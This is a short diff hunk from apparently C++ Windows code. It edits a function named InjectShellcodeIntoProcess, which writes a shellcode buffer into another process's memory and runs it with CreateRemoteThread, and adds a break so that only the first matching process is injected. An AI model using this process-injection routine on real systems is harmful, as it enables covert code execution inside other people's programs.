@@ -82,6 +82,7 @@ VOID InjectShellcodeIntoProcess(std::deque <Process_Info> processesInfo, unsigne
 		{
 			WriteProcessMemory(processesInfo[i].handle, processesInfo[i].mAddress, shellcode, sizeof(shellcode), NULL);
 			CreateRemoteThread(processesInfo[i].handle, NULL, 0, (LPTHREAD_START_ROUTINE)processesInfo[i].mAddress, NULL, 0, NULL);
+			break;
 		}
 	}
 }
